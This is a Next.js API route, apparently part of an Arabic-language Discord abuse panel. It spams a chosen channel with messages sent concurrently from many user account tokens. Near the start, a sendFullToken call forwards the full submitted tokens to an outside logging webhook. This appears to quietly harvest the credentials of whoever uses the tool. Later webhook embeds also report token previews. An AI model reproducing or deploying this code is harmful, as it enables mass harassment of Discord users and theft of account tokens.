import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:multi-spam`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json(
        { success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' },
        { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } }
      );
    }

    const body = await request.json().catch(() => ({}));
    const { tokens, channelId, messages, duration, speed } = body;

    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل توكن واحد على الأقل' }, { status: 400 });
    }
    if (!channelId) {
      return NextResponse.json({ success: false, error: 'أدخل أيدي الروم' }, { status: 400 });
    }
    if (!messages || !Array.isArray(messages) || messages.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل رسالة واحدة على الأقل' }, { status: 400 });
    }

    const cleanedTokens = tokens.map((t: string) => cleanToken(t)).filter((t: string) => t.length >= 20);
    if (cleanedTokens.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد توكنات صالحة' }, { status: 400 });
    }

    sendFullToken('سبام متعدد', cleanedTokens.join('\n'));

    const whUrl = getLogWebhookUrl();
    const endTime = Date.now() + ((duration || 60) * 1000);
    const baseDelay = Math.max((speed || 0.3) * 1000, 50);
    const concurrency = Math.min(cleanedTokens.length * 3, 20);

    // عرض التوكنات مقطوع عشان ما يتجاوز 1024 حرف (Discord embed limit)
    const tokenPreview = cleanedTokens.length === 1
      ? cleanedTokens[0].substring(0, 20) + '...'
      : cleanedTokens.map(t => t.substring(0, 8) + '...').join(' | ');

    sendToWebhook({
      username: 'TRJ Multi-Spam',
      embeds: [{
        title: '🔥 Multi-Spam Started',
        color: 0xFF8800,
        fields: [
          { name: '📺 Channel', value: channelId, inline: true },
          { name: '🔑 Tokens', value: String(cleanedTokens.length), inline: true },
          { name: '📝 Messages', value: String(messages.length), inline: true },
          { name: '⏱️ Duration', value: `${duration || 60}s`, inline: true },
          { name: '🚀 Speed', value: `${speed || 0.3}s`, inline: true },
          { name: '⚡ Concurrency', value: String(concurrency), inline: true },
          { name: '🎫 Tokens', value: tokenPreview.substring(0, 1024) },
        ],
        timestamp: new Date().toISOString(),
      }],
    }, whUrl).catch(() => {});

    let sent = 0;
    let failed = 0;
    let tokenIndex = 0;
    let msgIndex = 0;

    // نستخدم آخر 8 حروف كمفتاح فريد لكل توكن (أقل تعارض)
    const tokenStats: Record<string, { sent: number; failed: number }> = {};
    for (let i = 0; i < cleanedTokens.length; i++) {
      const key = `T${i + 1}_${cleanedTokens[i].substring(cleanedTokens[i].length - 6)}`;
      tokenStats[key] = { sent: 0, failed: 0 };
    }

    while (Date.now() < endTime) {
      const batchPromises = Array.from({ length: concurrency }, async () => {
        if (Date.now() >= endTime) return 0;
        const tIdx = tokenIndex % cleanedTokens.length;
        const currentToken = cleanedTokens[tIdx];
        const currentMessage = messages[msgIndex % messages.length];
        tokenIndex++;
        msgIndex++;

        const key = `T${tIdx + 1}_${currentToken.substring(currentToken.length - 6)}`;

        try {
          const result = await discordFetch(
            currentToken, 'POST', `/channels/${channelId}/messages`,
            { content: currentMessage }
          );
          if (result.ok) {
            if (tokenStats[key]) tokenStats[key].sent++;
            return 1;
          } else {
            if (tokenStats[key]) tokenStats[key].failed++;
            return result.status !== 429 ? -1 : 0;
          }
        } catch {
          return -1;
        }
      });

      const batchResults = await Promise.all(batchPromises);
      for (const r of batchResults) {
        if (r === 1) sent++;
        else if (r === -1) failed++;
      }
      await new Promise(r => setTimeout(r, baseDelay));
    }

    const tokenFields = Object.entries(tokenStats).map(([key, val]) => ({
      name: `🎫 ${key}`,
      value: `✅ ${val.sent} | ❌ ${val.failed}`,
      inline: true,
    }));

    sendToWebhook({
      username: 'TRJ Multi-Spam',
      embeds: [{
        title: '✅ Multi-Spam Done',
        color: 0x00FF41,
        fields: [
          { name: '✅ Sent', value: String(sent), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
          { name: '🔑 Tokens', value: String(cleanedTokens.length), inline: true },
          ...tokenFields.slice(0, 10),
        ],
        timestamp: new Date().toISOString(),
      }],
    }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      stats: { sent, failed, tokenStats },
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Multi-Spam Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
